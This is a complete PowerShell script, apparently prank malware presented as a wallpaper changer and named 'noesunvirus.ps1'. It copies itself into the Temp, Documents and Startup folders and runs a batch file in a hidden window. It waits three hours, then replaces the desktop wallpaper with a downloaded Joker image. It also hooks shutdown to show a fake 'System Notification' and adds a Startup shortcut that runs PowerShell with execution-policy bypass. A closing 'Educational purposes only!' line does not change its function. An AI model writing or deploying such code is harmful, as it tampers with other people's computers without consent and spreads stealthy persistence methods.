$scriptPath1 = "$env:userprofile\AppData\Local\Temp\noesunvirus.ps1"
$scriptPath2 = "$env:userprofile\Documents\noesunvirus.ps1"
$scriptPath3 = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\noesunvirus.ps1"
$batFilePath = "$env:userprofile\Downloads\start.bat"
$batchUrl = "https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/start.bat"

$startDelayEnabled = $true
$delayHours = 3

function Get-ScriptPath {
    if (Test-Path $scriptPath1) { return $scriptPath1 }
    elseif (Test-Path $scriptPath2) { return $scriptPath2 }
    elseif (Test-Path $scriptPath3) { return $scriptPath3 }
    else { return $null }
}

$scriptPath = Get-ScriptPath

if ($null -eq $scriptPath) {
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batFilePath`"" -WindowStyle Hidden
    exit
}

if ($startDelayEnabled -eq $true) {
    Start-Sleep -Seconds ($delayHours * 3600)
}

$imagePath = "$env:userprofile\Pictures\background.jpg"
$imageUrl = "https://i.kym-cdn.com/editorials/icons/mobile/000/009/963/evil_jonkler.jpg"

if (-not (Test-Path $imagePath)) {
    Write-Host "Downloading image..."
    
    try {
        Write-Host "Trying to download with curl..."
        Invoke-Expression "curl -o `"$imagePath`" `"$imageUrl`""
        if (Test-Path $imagePath) {
            Write-Host "Image downloaded successfully with curl."
        } else {
            Write-Host "Curl failed. Trying Invoke-WebRequest..."
            Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
            if (Test-Path $imagePath) {
                Write-Host "Image downloaded successfully with Invoke-WebRequest."
            } else {
                Write-Host "Failed to download image with both curl and Invoke-WebRequest."
                exit
            }
        }
    } catch {
        Write-Host "Error during download: $_"
        exit
    }
} else {
    Write-Host "Image already exists. Setting as wallpaper."
}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 0x01)

function Show-ImageMessage {
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show("Why so serious?", "System Notification", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)
}

try {
    Register-WmiEvent -Query "SELECT * FROM Win32_ComputerShutdownEvent" -Action {
        Show-ImageMessage
    }
} catch {
    Write-Host "WMI not available in this environment."
}

$startupShortcutPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\SetWallpaper.lnk"

if (-not (Test-Path $startupShortcutPath)) {
    $WshShell = New-Object -ComObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut($startupShortcutPath)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
    $shortcut.Save()

    if ($MyInvocation.MyCommand.Path -ne $scriptPath1) {
        Copy-Item $MyInvocation.MyCommand.Path $scriptPath1
    }
}

# Educational purposes only!
